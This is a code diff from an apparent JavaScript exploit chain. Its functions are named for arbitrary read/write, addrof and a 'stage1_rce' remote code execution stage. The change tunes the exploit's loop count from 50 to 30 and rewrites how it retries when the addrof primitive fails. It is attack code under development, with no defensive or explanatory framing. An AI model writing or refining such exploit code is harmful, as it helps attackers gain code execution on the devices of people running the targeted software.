@@ -8797,7 +8797,7 @@ async function _aarw_main() {
         function _make_stage1(util, p_rce) {
             let run = exp();
             
-            const N = 50; // tunable count
+            const N = 30; // tunable count
             for (let i = 0; i < N; ++i) {
                 try {
                     run(util, p_rce);
@@ -10191,10 +10191,11 @@ async function main() {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
             print("inside stage1_rce from worker");
-            main().then(async (p_temp) => {
+            main().then((p_temp) => {
               if(!p_temp.addrof)
               {
-                let retryCount = 0; const maxRetries = 15; while(retryCount < maxRetries && !p_temp.addrof) { print("Failed rce, retry " + (retryCount+1) + "/" + maxRetries); p_temp = await main(); retryCount++; } if(!p_temp.addrof) { print("All retries exhausted"); }
+                print("Failed rce, retrying if possible");
+                main();
               }
             });
             break;
